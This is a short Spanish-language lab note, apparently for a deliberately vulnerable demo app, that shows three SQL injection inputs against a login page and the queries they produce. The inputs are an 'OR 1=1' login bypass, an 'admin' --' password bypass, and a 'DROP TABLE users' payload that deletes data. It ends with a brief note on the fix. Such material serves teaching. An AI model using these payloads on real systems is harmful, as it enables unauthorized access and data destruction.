#Inyección SQL
##El login page es vulnerable a ataques de inyección SQL
Probar los siguientes ejemplos:
###A. Esto iniciará sesión con la primer cuenta en la tabla users
    username: ' OR 1=1 --
    password: lo que sea
    SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'anything'
###B. Checar directamente si existe una cuenta admin
    usename: admin' --
    password: (blank)
    SELECT * FROM users WHERE username = 'admin' -- ' AND password = ''
###C. Eliminar la tabla usuarios (si se prueba, reiniciar la aplicación)
    Username: admin'; DROP TABLE users; --
    Password: (leave blank)
    SELECT * FROM users WHERE username = 'admin'; DROP TABLE users; -- ' AND password = ''
###* La solución hace que los inputs (username, password), sean tratados como inputs y no como código SQL directamente *

